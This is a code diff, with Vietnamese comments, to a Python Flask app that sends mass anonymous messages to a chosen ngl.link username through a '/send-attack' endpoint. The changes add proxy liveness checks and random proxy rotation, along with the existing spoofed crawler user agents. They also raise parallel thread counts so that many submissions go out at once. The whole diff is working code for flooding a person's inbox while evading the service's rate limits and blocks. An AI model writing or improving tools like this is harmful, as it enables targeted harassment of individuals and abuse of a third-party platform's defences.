@@ -68,10 +68,24 @@ USER_AGENTS = [
     "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)"
 ]
 
-# Đọc danh sách proxy vào RAM (khi khởi chạy)
+# ✅ Hàm kiểm tra proxy sống
+def is_proxy_alive(proxy):
+    try:
+        proxies = {
+            "http": f"http://{proxy}",
+            "https": f"http://{proxy}"
+        }
+        response = requests.get("http://httpbin.org/ip", proxies=proxies, timeout=5)
+        return response.status_code == 200
+    except:
+        return False
+
+# ✅ Load proxy sống vào RAM khi khởi chạy
 try:
     with open("proxy.txt", "r") as f:
-        PROXIES = f.read().splitlines()
+        all_proxies = f.read().splitlines()
+        PROXIES = [p for p in all_proxies if is_proxy_alive(p)]
+        print(f"✅ Đã load {len(PROXIES)} proxy sống.")
 except:
     PROXIES = []
 
@@ -79,6 +93,7 @@ except:
 def index():
     return render_template('index.html')
 
+# ✅ Hàm gửi 1 request
 def send_single_request(username, message, index):
     headers = {
         "Host": "ngl.link",
@@ -98,7 +113,15 @@ def send_single_request(username, message, index):
         "referrer": ""
     }
 
-    proxy = random.choice(PROXIES) if PROXIES else None
+    # Lấy proxy sống (nếu còn)
+    proxy = None
+    if PROXIES:
+        for _ in range(5):  # thử 5 proxy ngẫu nhiên
+            candidate = random.choice(PROXIES)
+            if is_proxy_alive(candidate):
+                proxy = candidate
+                break
+
     proxies = {
         "http": f"http://{proxy}",
         "https": f"http://{proxy}"
@@ -107,7 +130,7 @@ def send_single_request(username, message, index):
     try:
         with requests.Session() as session:
             response = session.post("https://ngl.link/api/submit", headers=headers, data=payload, proxies=proxies, timeout=10)
-        print(f"[{index+1}] Status Code: {response.status_code} | Proxy: {proxy}")
+        print(f"[{index+1}] ✅ Status: {response.status_code} | Proxy: {proxy}")
         return {
             'status_code': response.status_code,
             'success': response.status_code == 200,
@@ -115,7 +138,7 @@ def send_single_request(username, message, index):
             'response': response.text
         }
     except Exception as e:
-        print(f"[{index+1}] Error with proxy {proxy}: {e}")
+        print(f"[{index+1}] ❌ Lỗi với proxy {proxy}: {e}")
         return {
             'status_code': 0,
             'success': False,
@@ -123,6 +146,7 @@ def send_single_request(username, message, index):
             'response': str(e)
         }
 
+# ✅ Gửi hàng loạt yêu cầu song song
 @app.route('/send-attack', methods=['POST'])
 def send_attack():
     data = request.json
@@ -132,9 +156,10 @@ def send_attack():
 
     results = []
 
-    MAX_THREADS = min(30, count)
+    # Tính số thread hợp lý theo proxy sống
+    max_threads = max(5, min(100, len(PROXIES) * 2))
 
-    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
+    with ThreadPoolExecutor(max_workers=min(max_threads, count)) as executor:
         futures = [executor.submit(send_single_request, username, message, i) for i in range(count)]
         for future in as_completed(futures):
             results.append(future.result())
